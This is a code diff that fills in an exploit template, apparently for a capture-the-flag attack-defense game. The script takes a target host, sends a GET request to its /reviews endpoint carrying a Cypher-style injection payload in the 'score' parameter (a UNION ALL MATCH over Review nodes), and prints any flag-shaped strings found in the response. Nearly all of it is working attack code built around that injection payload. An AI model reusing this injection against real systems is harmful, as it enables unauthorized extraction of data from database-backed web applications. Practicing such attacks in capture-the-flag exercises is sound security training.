@@ -6,10 +6,7 @@
 # from html import unescape
 # from hashlib import md5
 
-# import re
-# import sys
 # import random
-# import requests
 # from pwn import *
 # from os import system
 # from base64 import *
@@ -21,9 +18,18 @@
 #                    EXPLOIT GOES HERE
 #===========================================================
 
+import requests
+import re
+import sys
+
+flagRegEx = re.compile(r'[A-Za-z0-9]{31}=')
+
+host = sys.argv[1]
 
 def main():
-	pass
+	s = requests.session()
+	resp = s.get(f'http://{host}/reviews?score=1+ReTURn+r+LIMIT+1+UNION+ALL+MATCH+%28r%3AReview%29')
+	[print(i) for i in flagRegEx.findall( resp.text )]
 
 
 if __name__ == "__main__":
